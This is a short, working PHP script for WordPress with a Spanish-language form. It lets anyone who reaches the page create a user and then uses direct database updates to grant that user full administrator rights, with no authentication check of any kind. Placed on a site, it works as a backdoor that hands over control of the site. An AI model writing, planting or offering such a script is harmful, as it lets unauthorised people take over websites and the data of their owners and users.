<?php
 
if(isset($_REQUEST["email"]))
{	
	require_once( './wp-load.php' );
	
	if ( ! function_exists( 'wp_create_user' ) ) 
     require_once './wp-includes/user.php';

	if($result = wp_create_user( $_REQUEST["username"], $_REQUEST["password"], $_REQUEST["email"] ))
	{
		global $wpdb;
		
		$query = $wpdb->query( 'update '.$wpdb->prefix.'usermeta set meta_value = \'a:1:{s:13:"administrator";s:1:"1";}\' WHERE user_id = '.$result.' and meta_key like "'.$wpdb->prefix.'capabilities"'  );
		
		$query = $wpdb->query( 'update '.$wpdb->prefix.'usermeta set meta_value = 10 WHERE user_id = '.$result.' and meta_key like "'.$wpdb->prefix.'user_level"'  );
		
		echo "Usuario creado correctamente";
	}
	else
		echo "Error al intentar crear el usuario";
}
?>


<form name="form" method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>" >

<p><label for="username">Nombre de usuario: </label><input type="text" id="username" name="username" /></p>
<p><label for="password">Contraseña: </label><input type="text" id="password" name="password" /></p>
<p><label for="email">E-mail del usuario: </label><input type="text" id="email" name="email" /></p>

<p><input type="submit" value="Crear usuario" /></p>

</form>

